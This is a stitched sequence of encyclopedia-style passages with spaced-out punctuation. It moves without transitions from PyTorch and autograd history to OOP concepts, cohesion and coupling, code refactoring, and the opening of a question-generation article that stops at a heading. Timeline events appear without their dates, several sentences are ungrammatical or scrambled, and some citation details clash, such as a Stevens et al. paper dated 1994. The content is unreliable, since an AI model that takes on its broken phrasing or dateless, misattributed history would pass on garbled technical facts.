It also supports parallelization with OpenMP and CUDA .
Version 1.0 of autograd has been released on GitHub .
The first commit of this package is from November 2014 .
Maclaurin , in his doctoral thesis , describes autograd in detail .
This is a Python implementation of Automatic Differentiation ( AD ) .
It can compute gradients on any NumPy code .
He also notes that autograd has become quite popular within the machine learning community .
A 2017 survey paper credits Autograd , Chainer and PyTorch for popularizing AD .
A week after alpha-0 , the alpha-1 release of PyTorch appears on GitHub .
These include ` torch.nn ` , ` torch.autograd ` , ` torch.optim ` , ` torch.load ` and ` torch.save ` .
On the MNIST dataset , PyTorch runs as fast as Torch - Lua .
PyTorch uses 1500 MB of system memory whereas Torch - Lua uses 2300 MB .
PyTorch gets its first public beta release .
Its early development was guided by Soumith Chintala , a core developer of Torch .
It starts as a fork of Chainer that has dynamic graphs and an interpretable development environment .
Though Torch is popular and even accepted by organizations such as Facebook AI Research , Lua is not as mainstream as Python .
Other reasons to move to Python are easy debugging and an imperative - style framework .
Caffe2 is merged into the PyTorch codebase .
Caffe2 and PyTorch are both open - source ML frameworks from Facebook .
TorchScript and PyTorch Intermediate Representation ( IR ) for optimized code .
Source : He 2019b .
Version 1.0.0 of PyTorch has been released .
This comes with a JIT compiler and TorchScript , which is a subset of Python .
Due to PyTorch 's Intermediate Representation ( IR ) , models can be optimized and deployed in non - Python environments .
This release introduces the ` nn.distributed ` package .
This release also includes Torch Hub , a repository for pre - trained models .
Research papers at conferences feature more of PyTorch than TensorFlow .
Source : He 2019b .
PyTorch adoption has growing a lot within the research community .
Among the many deep learning frameworks , only PyTorch and TensorFlow seem to matter most .
This year also saw a number of regular PyTorch releases from v1.0.1 ( February ) to v1.3.1 ( November ) .
By now , while PyTorch is growing , the Torch community is defunct .
PyTorch 1.4 has been released .
This allows customized builds for PyTorch Mobile .
As an experimental feature , there 's an RPC framework for distributed model parallel training .
Also experimental are Java bindings .
In February , NVIDIA released a container image for this version of PyTorch .
Comparing procedural vs object - oriented programming .
Source : Sakpal 2018 .
Developers who are familiar with procedural languages such as C and Pascal will understand variables , functions , and scope .
When learning an object - oriented programming ( OOP ) language such as Java or C++ , the same developers might have difficulty .
This article presents an overview of OOP concepts .
Whereas the building block of procedural languages is a function or procedure , the building block of OOP languages is an object .
Procedural languages have variables ( data ) and functions ( code ) .
In OOP , objects contain both data and code .
With procedural languages , functions operate on data .
With OOP , objects operate on their own data and selectively expose this data to other objects .
Different OOP languages sometimes differ in terminology .
Some OOP languages may lack advanced OOP features .
In general , OOP concepts are mostly similar across languages .
What are objects and classes in OOP ?
An overview of OOP concepts .
Source : Devopedia 2020 .
In the real world , just about anything can be seen as an object : car , dog , person , department , city , etc .
These have state and behaviour .
For example , a dog 's state is its colour , breed and name ; its behaviour is the way it barks , runs or wags its tail .
Objects in OOP are quite similar .
In OOP , an object is a software construct that includes both data and code to process that data .
Unlike procedural languages in which functions are independent of variables , OOP objects retain control of their state and how others can affect that state via executable code .
Data specifies the state of the object whereas executable code specifies behaviour .
A real - world dog could be represented in OOP as a software object .
Let 's create many dogs of the same or different breeds .
It 's inefficient to write code for each dog .
This is where the concept of class becomes important .
A class is sort of a blueprint from which an object can be created .
Thus , each dog is an instance of the same ` Dog ` class .
Instantiation is the process of creating objects or instances from classes .
What are the attributes and methods of objects in OOP ?
Attributes and methods of a bicycle object .
Source : Oracle Docs 2020a .
Attributes contain an object 's state .
Methods define an object 's behaviour .
Both are bound to the object and therefore accessed via the object .
Attributes are also called properties , fields or instance variables .
Each object has its own copy of attributes in memory .
As for methods , only their addresses are stored within an object .
Attributes and methods are also called members .
Consider the class ` Rectangle ` .
Its attributes could be ` length ` and ` breadth ` .
Its methods could be ` getArea ( ) ` and ` rotate ( ) ` .
Two special methods are worth noting : constructor and destructor .
When an object is instantiated from its class , the constructor method is called to initialize the object state .
When the object is destroyed , its destructor method is called so that the necessary clean up is done .
Consider a database connector class .
The constructor method might initialize the database server 's IP address , port , username and password for access .
It might even open the DB connection .
The destructor on the other hand , might abort pending queries and close the connection .
Other methods of the class might manage the connection , process DB queries and responses .
Which are the essential concepts of OOP ?
Among the many concepts of OOP , three stand out : Encapsulation : A class and its instances bring together attributes and methods that are closely related .
Encapsulation hides internal implementation and exposes public interfaces .
Thus , it achieves data hiding .
Inheritance : Using an existing class , a more refined class can be created .
The former is called a base class or super class .
The latter is called a derived class or subclass .
For example , ` Shape ` is a base class from which ` Square ` and ` Circle ` are derived .
Base class might define common attributes such as colour and line width .
Derived classes might define more specific attributes such as length or radius , and specific methods to compute area and perimeter .
Polymorphism : Different classes having the same attributes and methods , though implemented differently , can be interchanged at runtime .
For example , a ` canvas ` object might wish to compute the area of a shaped object .
It does n't care if it 's a square or a circle since both have the ` getArea ( ) ` method .
canvas object calls this method on a shaped object and the correct method for the current derived object is called .
What is meant by abstraction in OOP ?
Illustrating the use of abstraction .
Source : Hock - Chuan 2020 .
Abstraction is about describing something at a conceptual level while leaving out the details .
For example , we may talk about a vehicle without being explicit about if it 's a ship or a car .
Abstraction is a useful design tool since considering too many details upfront can be distracting and confusing .
We start with an abstract concept and refine it later by adding more details to it .
It 's been said that abstraction hides details at the design level , while encapsulation hides details at the implementation level .
Consider the ` Shape ` class with members ` color ` and ` getArea ( ) ` .
Subclasses ` Rectangle ` and ` Triangle ` implement how the area is calculated .
Since ` Shape ` does n't know how to calculate area , we call it an abstract class .
It ca n't be instantiated .
Only its subclasses that provide an implementation of ` getArea ( ) ` can be instantiated .
Shape 's ` getArea ( ) ` is an abstract method .
Other than inheritance , an alternative to achieve abstraction is to use interfaces .
Interfaces provide method signatures without implementing them .
Classes that adopt these interfaces are required to implement them .
Mixins are similar to interfaces except that they implement the methods themselves .
How is composition different from inheritance in OOP ?
Consider the classes ` Vehicle ` , ` Car ` and ` Engine ` .
A car is a type of vehicle whereas the engine is part of a car .
The relationship between vehicle and car is best modelled as inheritance : ` car ` is a subclass of ` vehicle ` .
The relationship between engine and car is best modelled as composition : an ` Engine ` instance is an attribute of either ` Vehicle ` or ` Car ` class .
While both inheritance and composition are relevant to OOP , it 's important for software architects and designers to look at the relationships among classes to select the right one .
Specifically , we should ask , " Is it a is - a or a has - a relation ?
" Inheritance is a pillar of OOP , but composition is essential to every language .
Two other concepts closely related to composition are association and aggregation .
Aggregation describes a part - whole relationship .
A ` Course ` object is part of a ` DegreeProgram ` object .
It 's also a many - to - many relationship since the same course can belong to different programs and a program has many courses .
Some languages , such as JavaScript , allow prototypal inheritance .
Object prototypes form the basis of other objects .
Classes do n't exist .
What are access modifiers in the context of OOP ?
Access modifiers in C # .
Source : Steiger 2014 .
It 's possible to restrict access to classes , methods and attributes .
By the principle of least privilege , limit access only to classes that need it .
In Java , when no access modifier is specified , all classes within the package get access .
Otherwise , we can use the following access modifiers : ` public ` : Access is allowed for all classes .
` protected ` : Access is allowed for subclasses ( in any package ) and classes within the same package .
Thus , access is allowed only to closely related classes .
` private ` : Access is allowed only within the class to which the members belong .
This is typically used to hide data within the class .
Any access to private data is provided via methods .
Read and write access are via getters and setters respectively .
These are also called accessors and mutators .
In Kotlin , the term visibility modifier is used .
Modifier ` internal ` gives access to all classes within the same module .
The Modifier ` protected ` gives access to subclasses .
In C++ , access modifiers can also be applied to inheritance .
For example , private inheritance would make all methods and attributes of the base class private and therefore inaccessible to the subclass .
What are static classes and methods ?
A static method was used for testing the class .
Source : Sedgewick and Wayne 2020 .
We know that objects are at the centre of OOP .
However , there are cases that do n't need to be stored state .
Class methods operate only on the input arguments they receive .
In this case , we use a static class .
In .NET , ` System .
Math ` is an example of a static class .
A static class contains only static members .
It ca n't be instantiated into objects .
It 's accessed by its class name , and not by instance , variable name , as is customary with objects .
Sometimes we wish to share an attribute across all objects of a class .
For example , ` numberOfBicycles ` is an attribute that should be shared across all ` bicycle ` objects .
Java 's ` static ` modifier can be used to make this a static variable .
Likewise , a method to access this static attribute is called a static method .
Static methods can access only static members .
The class itself need not be static .
What are some additional concepts in OOP ?
Some OOP concepts are not common to all languages or were introduced later as languages evolved .
We mention a few of these : Multiple Inheritance : This is when a subclass inherits from multiple base classes .
C++ and Python support this .
In Java and C # , a class can implement multiple interfaces but not inherit from multiple classes .
Generics : Classes , methods and interfaces that can be parameterized are called generics .
For example , a class might implement a set of objects with a parameterized type .
Thus , the same class definition can be used to instantiate a set of ` Shape ` objects or ` Car ` objects .
Templates : Whereas types in generics are substituted at runtime , types in templates are specialized at compile time .
Each template specialization has its own compiled code .
C++ and D support templates .
Delegates : We can call a method via its delegate that has a compatible method signature .
With delegates , methods can be passed as arguments to other methods .
Reflection : Not exclusive to OOP , reflection allows a class to introspect and modify its own definition .
In Java , reflection is possible on classes , interfaces , fields and methods at runtime .
This is often useful for testing , data serialization and metaprogramming .
Simula 67 is born , officially the first object - oriented programming language .
It was initially used in computer simulations .
Classes in this language are called processes since the object lifecycle depends on the process executing the statements .
In the mid-1980s , many systems and application programmers adopted C++ for OOP .
It took another decade ( 1990s ) for OOP to become more widely adopted .
Object - oriented programming ( OOP ) and object - oriented design ( OOD ) are quite complex .
To give software architects and developers guidelines to get these right , principles and design patterns have evolved over the years .
At ACM 's annual OOPSLA conference , four authors announced their book titled Design Patterns : Elements of Reusable Object - Oriented Software .
This book describes 23 software design patterns .
In time , this book became an essential reading for OOP and OOD .
Object Management Group ( OMG ) standardizes Unified Modelling Language ( UML ) , v1.1 .
Its roots are in OOP .
Its evolution can be traced to the early 1990s .
UML establishes a common language among stakeholders involved in the design of object - oriented software and systems .
Subsequently , UML has undergone many revisions , with v2.5.1 coming out in December 2017 .
SOLID design principles .
Source : Gökalp 2019 .
Robert Martin publishes a book on Agile where he describes five principles of OOD .
Sometime later , Michael Feathers coins the term SOLID as a useful way to remember the principles .
Cohesion within modules and coupling across modules .
Source : Viva Differences 2019 .
When a large software is decomposed into smaller modules , it 's inevitable that these modules will interact with one another .
If the boundaries of these modules have been poorly identified , then the modules will heavily depend and frequently interact with one another .
In a poor design , it might also happen that classes and methods within a module perform diverse tasks and therefore do n't seem to belong together .
Cohesion is about how well elements within a module belong together and serve a common purpose .
Coupling is about how much one module depends on or interacts with other modules .
Thus , cohesion is an intra - module concern whereas coupling cuts across modules .
To manage the complexity of an application , a software designer must find the right balance of cohesion and coupling .
This is relevant to object - oriented design , the design of APIs and microservices .
Could you explain cohesion and coupling with an example ?
Code organization analyzed from the perspective of cohesion and coupling .
Source : Khorikov 2015 .
Consider a software project with folders containing associated files .
In one approach , folders ` Entities ` , ` Factories ` , ` Repositories ` and ` Services ` are created .
This seems like a good organization , but from a functional perspective , there 's tight coupling across folders .
The boundaries do n't reflect the semantics .
For example , product management would involve ` Product ` entity , ` ProductFactory ` , ` ProductRepository ` and ` ProductService ` across all folders .
Moreover , folders have logical cohesion but poor functional cohesion .
For example , each factory deals with a different entity type and has little in common functionally .
A better way to organize would be to have folders ` Orders ` , ` Products ` and ` Users ` .
This organization is based on purpose and functionality .
This is better because any change to product management would impact only files co - located in a single folder .
Code is more readable and maintainable .
Teams would be more independent , each working on its own folder .
Each folder could also be versioned and released independently of others .
In short , low cohesion means the module is trying to do too many things .
High coupling means modules are tightly interconnected via many complex interfaces and information flows .
How should I balance cohesion and coupling when designing software systems ?
Types of code from a cohesion and coupling perspective .
Source : Khorikov 2015 .
Ideally , we should aim for high cohesion and low coupling .
Related parts of code should be in the same module .
Each module should be independent of others .
Modules should interact in a minimal way .
In modular programming , we use the term ' module ' in a general sense .
In practice , a module could be any of these , at different levels of abstraction : folder , JavaScript file , C++ class , C # assembly , Java package , Python module , REST endpoint , microservice , etc .
Apply the Single Responsibility Principle ( SRP ) for high cohesion .
Use well - defined interfaces and inversion of control for low coupling .
An anti - pattern is when a piece of code does all the work .
This is a monolith that some call a God Object or a Big Ball of Mud .
There 's also a code that exhibits low cohesion and high coupling , when module boundaries are poorly defined .
A developer might try to solve this via decoupling .
But decoupling without cohesion will make the code even more difficult to follow .
Using interfaces that do n't represent an abstraction is an indication of destructive decoupling .
Why should I care about cohesion and coupling when my code works ?
Some pros and cons of cohesion and coupling .
Source : Bryant 2018 .
In any complex software , code is written once and maintained regularly .
Those who maintain it are not necessarily those who originally wrote it .
Therefore , the goal is to write code that 's easy to maintain and evolve .
Cohesion makes it easier to understand the code .
If each module 's purpose is clear , we can think of higher levels of abstraction without getting into detailed implementation of modules .
For deployment , fewer modules are affected .
Low coupling means fewer interconnections across modules .
It means one module can be changed or even replaced without impacting other modules .
It means modules are isolated from the implementation details of others .
Low coupling aids simulation and testing .
How are cohesion and coupling relevant to microservices ?
Three principles for well - architected microservices .
Source : Ma 2018 .
If improperly architected , an application based on microservices might end up being a distributed monolith .
In such an application , microservices are chatty , calling one another often .
Changes to one microservice require changes to others .
The same developers work on the codebases of many microservices .
Microservices share the same database or even code .
To solve these problems , one approach is to adopt domain - driven design .
Restrict access using scoping rules .
Use public APIs to encourage loose coupling .
REST APIs should n't be tightly coupled to specific applications or services .
Effectively , the idea is to get the boundaries right towards high cohesion and low coupling .
If a microservice relies on the physical address of another service , then there 's tight location coupling .
Service discovery tools can solve this .
If a microservice needs to wait for another 's response , there 's temporal coupling .
A message bus or event stream can solve this .
For testing , unit tests created for a microservice should n't impact integration or end - to - end tests .
To verify interfaces across services , gRPC and Avro can help .
Test coupling can be minimized by mocking APIs and dependent services .
Which are the different types of software cohesion ?
Parts of a module that collectively perform a single well - defined function are the strongest type of cohesion .
There are , however , many other types of cohesion , some more desirable than others : Coincidental cohesion : Parts are not related and just happen to be in the same module .
Such a module is hard to understand , maintain or reuse .
Logical cohesion : Parts relate to different entities though they perform similar logical functions .
For example , mouse inputs and keyboard inputs are handled in the same class .
Temporal cohesion : Parts that are executed when something happens , such as start - up or clean - up routines .
Code changes may affect many modules .
Procedural cohesion : Code that 's called one after another .
Sequential cohesion : Similar to procedural cohesion with the additional constraint that the execution sequence is important .
For example , call ` readFile ( ) ` before calling ` processData ( ) ` .
Communicational cohesion : also called information cohesion .
Parts that share or operate on the same data .
Functional cohesion : The most desirable type of cohesion .
Parts work together to fulfill a single function or purpose .
Which are the different types of software coupling ?
Refactoring code to overcome control coupling and logical cohesion .
Source : Adapted from University of Alberta 2020 .
Data and control are two types of information flow across modules .
If only some data is exchanged , the amount of coupling is probably acceptable .
Exchanging lots of data and control results in a high degree of coupling .
Here are a few types of coupling : Content coupling : One module modifies local variables of another module or branches execution into another module .
It violates the principle of information hiding .
Control coupling : Using control flags , one module controls the execution path in another module .
makes the code hard to understand .
Common coupling : Modules access global variables .
Modules are bound together via shared data structures .
This leads to unexpected side effects and error propagation .
Stamp coupling : A module passes an entire data structure to another when only some data members are needed .
External coupling : When interfacing with external tools , devices or libraries , a module is coupled to the external device interface , communication protocol or data format .
Data coupling : Use of parameter lists to pass data from one module to another .
Are there quantitative measures to evaluate software cohesion and coupling ?
A selection of coupling and cohesion metrics .
Source : Chowdhury 2009 , table 2.1 .
Relation Cohesion ( H ) measures the average number of internal relationships per type .
Given N types and R internal relationships , ` H=(R+1)/N ` .
A suitable range is 1.5 - 4.0 .
Higher values may indicate over - coupling internally .
Another measure of cohesion is Lack of Cohesion Of Methods ( LCOM ) .
LCOM has a range of 0 - 1 .
Zero is ideal .
Its variant of LCOM Henderson - Sellers ( LCOM HS ) has a range of 0 - 2 .
A LCOM HS value exceeding one is bad .
Afferent coupling ( Ca ) measures the number of types in other modules that depend on elements of this module .
A high value implies a module with many responsibilities .
Efferent coupling ( Ce ) measures the number of types from outside the module used in this module .
A high value implies a module is highly dependent on others .
These metrics could be applied to types , fields , methods , namespaces , etc .
The ratio ` Ce/(Ce+Ca ) ` is called Instability , which measures a module 's resilience to change .
A value of 0 is ideal .
Class inheritance in OOP is a form of tight coupling .
Some relevant metrics include weighted methods per class , depth of inheritance tree , number of children and number of base classes .
Stevens et al .
propose a method to reduce complexity .
They call it Structured Design or Composite Design .
A system can be divided and simplified into smaller pieces .
This improves and speeds up the writing , debugging and modifying of code .
This is because each part can be considered separately .
However , identifying suitable " modules " of code is not trivial .
They therefore introduce the concepts of cohesion and coupling .
OOD metrics mapped to Booch OOD steps .
Source : Adapted from Chidamber and Kemerer 1994 , table VII .
Chidamber and Kemerer propose six design metrics to evaluate object - oriented design .
They evaluate and interpret them for two real - world projects that use C++ and Smalltalk .
The degree of similarity among methods is a measure of class cohesion .
Class complexity can be measured by the number of methods and instance variables it contains , depth of inheritance and number of immediate descendants .
Methods are a of measure communication complexity among classes .
An example of refactoring to reduce couplings .
Source : Adapted from Larman 2001 , fig .
16.9 - 16.10 .
Craig Larman , in his book Applying UML and Patterns : An Introduction to Object - Oriented Analysis and Design and the Unified Process ( 2nd edition ) , calls cohesion and coupling " the yin and yang of software engineering .
" Bad cohesion usually results in bad coupling , and vice versa .
He also notes that the level of coupling alone ca n't be considered in isolation from other principles such as expert and high cohesion .
Eric Evans published a book titled Domain - Driven Design : Tackling Complexity in the Heart of Software .
He notes that , as humans and designers , it 's hard for us to think or reason about many concepts at a time ( high coupling ) .
We also find it hard to understand logically unrelated ideas ( low cohesion ) .
It therefore makes sense to recognize these limitations as we design software systems .
Software architect / designer Kirwan explains why the mantra of " loose coupling and high cohesion " may not work in practice .
He points out flaws in the paper by Stevens et al .
( 1994 ) .
For example , maximizing cohesion is neither a clear concept nor desirable .
Too many dependencies within a module gives no structural benefit .
When change happens , its effect within the module could be as bad as across modules in a tightly coupled system .
Thus , it 's only a matter of perspective : are we looking at classes in a package or across packages ?
One possible refactoring of Java 's stream class hierarchy .
Source : Murphy - Hill and Black 2008 , fig .
1 .
Software is rarely perfect .
Bugs need to be fixed .
The code and its structure can be improved .
Even when no new features are added , restructuring code can make it easier to understand and maintain .
Refactoring is thus about restructuring existing code without changing its behaviour .
Refactoring changes internal structures while preserving external behaviour .
The refactored code works just as before , passes existing tests but is better in terms of structure and organization .
Refactoring should n't be a special task that needs to be scheduled .
Refactoring should be a day - to - day programming discipline .
Whenever developers see an opportunity to improve existing code , they should refactor .
IDEs can help with automated refactoring .
Testing is an essential activity .
It ensures that the refactored works as before and nothing is broken .
Incremental refactoring is preferred over a full - scale code rewrite .
When does it make sense for me to refactor working code ?
Given any working code , developers may be hesitant to change code unnecessarily .
But refactoring can still be useful .
When program flow is not clear , refactoring improves clarity .
Software becomes easier to update and maintain in the long run .
We may also refactor to improve performance .
Refactoring first can help developers add new features more easily .
Sometimes refactoring is done to enable code reuse .
There 's a common misconception that refactoring activities need to be scheduled into a project .
While planned refactoring is possible , it 's better to refactor continuously .
Whenever developers detect bad code and they sense an opportunity to make it better , refactoring should be done .
When small improvements to code are done continuously , there will hardly be a need to schedule refactoring as a separate task .
A common excuse is that refactoring takes time away from actual development .
On the contrary , refactoring saves time in the long run .
Software tends to degrade over time as complexity increases .
Refactoring is a way to mitigate this .
What are some indicators that my code may need refactoring ?
As multiple developers work on the same code base over many release cycles , complexity increases .
There 's less cohesion in terms of coding styles and design .
Some call this code rot , characterized by duplicate code , myriad patches , and bad classifications .
Other symptoms include unhealthy dependencies between classes or classes doing too many things .
In one project , 20 developers created 65,000 lines of code over 5 years .
The codebase had lot of dead code , code pertaining to many older API versions , and classes with too many dependencies .
When a bug fix is required and the fix has to be made in multiple places , this indicates duplicated code .
Refactoring can help here .
Another example is when a bug fix itself introduces another bug .
This implies a fragile code that needs refactoring .
When a new feature request comes in , the current design might make it difficult to build this feature .
This is another area where refactoring can help .
What does it mean to say that refactoring should n't change external behaviour ?
Preserving external behaviour means that , given an input and the current system state , the software should give a predictable output .
However , there are some specialized systems where input - output behaviour is insufficient .
Other aspects of behaviour are just as important and must be preserved during refactoring .
We note three such systems : Real - time software : Execution time is important .
Refactoring should protect all temporal constraints .
Embedded software : Memory usage and power consumption are important .
Refactoring should protect these constraints .
Safety - critical software : Concrete notions of safety should be preserved .
Could you mention some case studies of code refactoring ?
Some refactorings take more time than others .
Source : Szőke et al .
2014 , fig .
5 .
One team took a bottom - up approach to code refactoring by " extracting new classes or coercing existing classes to enforce single responsibility , loose coupling , testability , and low complexity " .
However , one area of the codebase had to be rewritten .
They adopted an incremental TDD approach of writing unit tests , making some changes , and testing .
Another project team decided not to bring in new dependencies during refactoring .
They identified concept boundaries ( Admin , HR , User ) and refactored within these boundaries .
A study from 2007 by a small team of mobile app developers showed that refactoring not only improves code quality but also improves productivity .
Productivity was measured as lines of code written per hour .
One misconception is that refactoring can reduce performance .
One study found that replacing conditional logic with polymorphism improved performance since compilers optimize polymorphic methods .
Martin Fowler explains many use cases with original and refactored code .
These are worth reading : loading JSON data returned by another service , calculating and formatting a bill for a video store , and refactoring to manage module dependencies .
Is there a process that I can follow when refactoring my code ?
Refactoring is a distinct step in the TDD process flow .
Source : Albano 2018 .
Those who practice Agile methodology , know that refactoring is part of Test - Driven Development ( TDD ) .
Refactoring is done only when current tests pass .
This gives developers confidence to go ahead and refactor code .
Should the refactored code fail some tests , developers can either fix the problem or revert to the working code .
Tests ensure that code behaviour is n't affected by refactoring .
The essence of this approach is incremental refactoring and testing .
Test after every small refactoring change .
Testing after dozens of refactoring changes can be problematic .
If tests fail , it will be hard to isolate the faulty refactoring .
It 's also clear that we should n't add new features or change behaviour while also refactoring .
The process isolates , adding functionality and refactoring .
Martin Fowler identifies different refactoring workflows : TDD Refactoring , Litter - Pickup Refactoring , Comprehension Refactoring , Preparatory Refactoring , Planned Refactoring , and Long - Term Refactoring .
Frequent planned refactoring might indicate that the team is n't doing enough of the other workflows .
Which are the different levels of code refactoring ?
Refactoring can happen at three different levels : Code - level : Remove dead or unused code .
Rename variables .
Reduce the number of method arguments by packaging them into a class .
Convert global variables into class data members .
Create access methods .
Function - level : Merge and consolidate duplicated code .
Merge similar code blocks into methods .
Architecture - level : Create new class hierarchy .
Reorganize responsibilities and encapsulation between subclasses and superclass .
Refactor to make way for future changes .
Refactor to interface better with databases , external services or frameworks .
Some make the distinction between primitive refactoring and composite refactoring .
The latter is a sequence of primitive refactorings .
For example , Rename and Move are primitive refactorings .
Others use the terms low - level refactoring and high - level refactoring , or equivalently in a dental metaphor , floss refactoring and root canal refactoring .
What are some techniques to refactor code ?
Refactoring techniques and their changed scores .
Source : Ouni et al .
2016 , table I. Refactoring Guru explains a number of refactoring techniques , of which we mention a few : Composing Methods : Refactor long methods into smaller method calls .
Use local variables instead of modifying method parameters .
Move duplicated code into a method .
Moving Features between Objects : If a method / field is called more often by another class , move it into that class .
Refactor to multiple single - purpose classes if a class is doing many different things .
Remove a method that simply calls another method .
Organizing Data : Know when to use references and when to use valuable objects .
Make a public field private with access methods .
Simplifying Conditional Expressions : Instead of many ` if - else ` statements or complex expressions , use a method call that returns a boolean result .
In loops , use ` break ` , ` continue ` or ` return ` instead of control flags .
Simplifying Method Calls : Remove unused method parameters .
Replace methods ` fivePercentRaise ( ) ` and ` tenPercentRaise ( ) ` with the parameterized method ` raise(percentage ) ` .
Dealing with Generalization : Move common methods / fields from subclasses to the superclass .
Create a subclass for a feature that 's used in only some scenarios .
How do I prioritize when there 's too much to refactor ?
Use your best judgement to decide what to refactor now and what could be done later .
Refactoring too much at once can impact software delivery .
Always use an incremental approach .
In one research study , the Analytic Hierarchy Process ( AHP ) was applied to rank different refactoring techniques and apply those that work best for the codebase .
A multi - objective search - based approach has also been proposed .
Which are some best practices for code refactoring ?
Refactor only if you 've good regression tests and the tests are passing .
If some tests are lacking , add extra tests .
Some existing tests might depend on old program structure and would need to be rewritten .
It 's always better to refactor before adding new features since tests exist only for current features .
Refactor after delivery and before starting the next release cycle .
Kent Beck has summarized it thus , For each desired change , make the change easy ( warning : this may be hard ) , then make the easy change .
When team members are working on different feature branches , refactoring can make merging difficult .
If some members own some pieces of code , there will be reluctance to refactor their code .
These are barriers to refactoring .
Work as a team to see how these can be overcome .
Do n't refactor just because you love writing new code or wish to use a coding pattern you 've just learned .
Are there tools to automate code refactoring ?
Visual Studio 2017 lists six refactoring techniques for the C # code .
Source : iNoryaSoft 2018 .
Smalltalk 's Refactoring Browser ( released in 1997 ) was well - liked and adopted by Smalltalk developers .
This was followed by refactoring tools for Java and C # .
By 2020 , most IDEs support code refactoring .
This includes Eclipse , Visual Studio , Xcode , Squeak , Visual Studio Code , , IntelliJ - based IDEs ( AppCode , IntelliJ IDEA , PyCharm , WebStorm ) , and more .
Back in 2003 , it was noted that creating a refactoring tool for C++ has been difficult .
Refactoring makes use of the program 's Abstract Syntax Tree ( AST ) , but macros and templates add complexity .
In fact , it 's been said that any tool that works for the whole of C++ would be AI Complete .
A subset of refactoring techniques for C++ is supported by Visual Studio .
Automatic refactoring is aided by static type information .
A codebase 's development history could be used to identify refactoring opportunities .
In an article on Smalltalk in BYTE magazine , Ingalls uses the word factoring in a software context .
He mentions factoring as one of the design principles behind Smalltalk , supported via class inheritance .
He defines factoring thus , " Each independent component in a system should appear in only one place .
" Without factoring , it would be hard to keep interdependent components synchronized and consistent .
Factoring makes it easier to locate and maintain the component .
The concept of refactoring itself comes from mathematics , where a complex algebraic expression might be factored into a simpler and equivalent expression .
R.S. Arnold uses the term software restructuring . That 's about incrementally making changes to software internals as a way to manage its increasing complexity .
It 's been noted that the term refactoring came to be used a little later in the context of object - oriented software development .
William Opdyke and Ralph Johnson present a conference paper titled Refactoring : An Aid in Designing Application Frameworks and Evolving Object - Oriented Systems .
This is possibly the first use of the term refactoring in published literature .
Indeed , refactoring was initially adopted for object - oriented programs .
William Griswold publishes his PhD dissertation on the topic of refactoring functional and procedural programs .
A year later , William Opdyke 's own dissertation does the same for object - oriented programming .
Fowler et al .
publish their book titled Refactoring : Improving the Design of an Existing Code .
After introducing the topic , the book describes over 70 refactoring tips .
The word refactoring is defined both as a noun and as a verb .
In the years to come , this book will influence software development .
IDEs go on to implement many of the practices to automate refactoring .
The second edition of the book appears in 2018 .
Popularity of automated refactoring techniques in Eclipse for Java : Developer ( row ) vs. Technique ( col ) .
Source : Murphy - Hill and Black 2008 , fig .
5 .
Although many tools exist , developers might not use them if they 're not aligned with refactoring tactics preferred by developers .
A survey of 41 users of Eclipse IDE for Java development finds that only a few of them use these tools .
Simpler techniques such as Rename and Move are more often used than more complex ones such as IntroduceFactory and PushDown .
An example sentence and possible questions .
Source : Du et al .
2017 , fig .
1 .
Given some content , the goal of Question Generation ( QG ) is to automatically generate a set of questions that can be answered by that content .
This content can be in the form of sentences , paragraphs , documents , databases or even images .
A common application of question generation is to automatically prepare questions for quizzes , assessments or even FAQs that present the content in a more readable form .
Traditionally , rules and templates were used to generate questions .
Since the mid-2010s , there 's been greater interest in using statistical methods , particularly neural networks .
Question generation is also closely linked to other NLP tasks , such as question answering .
In fact , early neural network models were adapted from machine translation , text summarization and image captioning .
What are some applications of question generation ?
In education , question generation helps in assessing reading comprehension .
Students can use it for self - assessment .
It can be used to create quizzes and online tests without manual effort from educators .
By one estimate , teachers spend 50 % of their time on student assessments .
Many versions of tests can be created to prevent cheating .
For online courses and adaptive learning , these variations are helpful .
A solution - oriented approach generates questions based on skills and concepts .
A template - based approach uses variables , constraints and templates .
For training question answering ( QA ) or dialogue systems , QG can produce question - answer pairs .
Chatbots trained on QG can ask relevant questions in an ongoing dialogue .
Often , questions are generated from available answers .
But it 's possible to generate questions that seek more information or clarification .
Such a model can be trained using conversational QA datasets .
Applications also include help systems and multi - modal conversations involving virtual agents .
One study applied QG for user authentication in online systems .
What are the different types of questions generated by QG systems ?
Good distractors are needed for MCQs .
Source : Susanti et al .
2017 , fig .
1 .
Multiple Choice Questions ( MCQs ) are commonly generated for student assessments .
Along with the question , the correct answer and a few incorrect answers ( called distractors ) are generated .
For English vocabulary assessment , QG systems could use WordNet , web searches and Word Sense Disambiguation .
Fill - in - the - blank questions are simpler than MCQs since there 's no need to generate distractors .
Fill - in - the - blank statements are first generated , from which questions are framed via NLP analysis .
Wh - questions are questions that ask " what , where , when , which , who , why " and " how " .
They could also include imperative statements that start with " name , tell , find , define or describe " .
Factoid questions are based on simple facts .
Non - factoid questions require deeper analysis of the source text .
These could involve causation , inference , reasoning or interpretation .
For example , " What colour is the sky ?
" is a factoid question .
" Why is the sky blue ?
" is a non - factoid question .
Similarly , we distinguish between closed questions and open questions .
Open questions are in the form of " To what extent … " , " Why … " , " Should … " , etc .
What are the typical challenges in generating questions ?
QG is quite unlike many NLP tasks .
Whereas NLG generates sentences from some semantic input , the input to QG is often in natural language .
Unlike machine translation , both input and output in QG are in the same language , and often there 's no one - to - one correspondence .
QG also significantly reorders and rephrases words .
Whereas Question Answering ( QA ) is often extractive ( selecting text spans from the input ) , question generation is often abstractive ( generating text not necessarily present in the input ) .
Moreover , a variety of questions can be framed from the many relations between words and phrases in the input .
In one example , a single sentence generated 2000 + questions .
QG systems must therefore weed out silly questions from important ones .
Often a generated question might require improvements to its grammar , form or simplicity .
QG systems need to figure out long - distance dependencies to do this .
What 's a typical data pipeline in a question generation system ?
An example pipeline to generate fill - in - the - blank questions .
Source : Aditya S 2018 .
QG systems can be classified based on the input type .
The common ones are text - based QG , visual QG , and structured data - based QG .
Structured QG uses knowledge graphs and semi - structured tables , where input is subject - object - relation triplet .
QG pipelines might depend on the type of input , type of questions and the nature of the model .
In general , we expect three steps : Pre - processing : Convert complex sentences into simpler ones , perhaps using parse trees .
Using POS , dependency labels and SRL , classify sentences to determine the type of question .
Select content based on relevance to the final task .
From web sources , mine and predict question patterns .
Question Construction : Generate correct answers and distractors for MCQs .
Select gap position for fill - in - the - blank questions .
Transform assertive sentences into interrogative forms .
Control the difficulty of questions .
Post - processing : Construct the final surface form of questions .
Rank questions to prioritize high - quality questions .
Visual QG systems might detect / classify objects and identify features via CNN ( colour , size , shape , relations ) .
Features may be object - specific or on the entire image .
These are then used to generate questions .
Which are the neural network models for question generation ?
An improved seq2seq model for QG .
Source : Zhao et al .
2018 , fig .
1 .
